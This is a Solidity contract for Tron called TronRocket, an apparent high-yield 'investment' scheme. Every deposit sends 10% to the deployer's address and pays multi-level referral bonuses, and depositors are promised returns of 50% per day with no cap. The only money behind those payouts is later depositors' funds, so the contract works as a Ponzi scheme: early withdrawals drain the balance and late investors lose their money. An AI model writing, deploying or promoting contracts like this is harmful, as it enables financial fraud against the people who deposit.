//SourceUnit: TronRocket.sol

pragma solidity ^0.4.25;

contract TronRocket {
  struct Investor {
    bool registered;
    address referrer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint referrals_tier3;
    uint referrals_tier4;
    uint balanceRef;
    uint totalRef;
    uint totalDepositedByRefs;
    uint invested;
    uint paidAt;
    uint profit;
    uint withdrawn;
  }
  
  uint DAY = 28800;
  uint MIN_DEPOSIT = 200 trx;
  uint START_AT = 24537625;
  
  address public support = msg.sender;
  
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  mapping (address => Investor) public investors;
  
  event Deposit(address user, uint amount);
  event Withdraw(address user, uint amount);
  
  function register(address referrer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
      
      if (investors[referrer].registered && referrer != msg.sender) {
        investors[msg.sender].referrer = referrer;
        
        address rec = referrer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }
          
          if (i == 0) {
            investors[rec].referrals_tier1++;
          }
          if (i == 1) {
            investors[rec].referrals_tier2++;
          }
          if (i == 2) {
            investors[rec].referrals_tier3++;
          }
          if (i == 3) {
            investors[rec].referrals_tier4++;
          }
          
          rec = investors[rec].referrer;
        }
      }
    }
  }
  
  function rewardReferers(uint amount, address referrer) internal {
    address rec = referrer;
    
    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      
      uint a = amount * refRewards[i] / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      investors[rec].totalDepositedByRefs += amount;
      totalRefRewards += a;
      
      rec = investors[rec].referrer;
    }
  }
  
  constructor() public {
    for (uint i = 4; i >= 1; i--) {
      refRewards.push(i);
    }
  }
  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];
    
    return investor.paidAt > 0 ? investor.invested * (block.number - investor.paidAt) / DAY / 2 : 0;
  }
  
  function addProfit() internal {
    Investor storage investor = investors[msg.sender];
    
    investor.profit += withdrawable(msg.sender);
    
    investor.paidAt = block.number;
  }
  
  function deposit(address referrer) external payable {
    require(block.number >= START_AT);
    require(msg.value >= MIN_DEPOSIT);
    
    Investor storage investor = investors[msg.sender];
    
    register(referrer);
    support.transfer(msg.value / 10);
    rewardReferers(msg.value, investor.referrer);
    
    addProfit();
    
    investor.invested += msg.value;
    totalInvested += msg.value;
    
    emit Deposit(msg.sender, msg.value);
  }
  
  function withdraw() external {
    Investor storage investor = investors[msg.sender];
    
    addProfit();
    
    uint amount = investor.profit + investor.balanceRef;
    investor.profit = 0;
    investor.balanceRef = 0;
    
    msg.sender.transfer(amount);
    investor.withdrawn += amount;
    emit Withdraw(msg.sender, amount);
  }
}